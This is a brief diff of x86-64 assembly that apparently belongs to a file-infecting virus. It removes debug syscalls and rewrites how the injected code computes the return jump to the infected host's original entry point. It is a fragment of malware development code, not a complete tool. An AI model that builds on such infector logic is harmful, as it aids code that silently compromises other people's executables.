@@ -454,25 +454,11 @@ _host:
 	jmp _exit
 
 _infected:
-	mov rdi, [rel vaddr]
-	mov rax, 9
-	syscall
-	mov rdi, [rel entry_inject]
-	mov rax, 9
-	syscall
-	mov rdi, [rel entry_prg]
-	mov rax, 9
-	syscall
-
 	push r8
 	pop rax
 
-	mov rdi, [rel entry_inject]
-	sub rdi, [rel vaddr]
-	sub rax, rdi
-
-;	sub rax, [rel entry_inject]
-;	add rax, [rel vaddr]
+	sub rax, [rel entry_inject]
+	add rax, [rel vaddr]
 
 	add rax, [rel entry_prg]
 	sub rax, [rel vaddr]
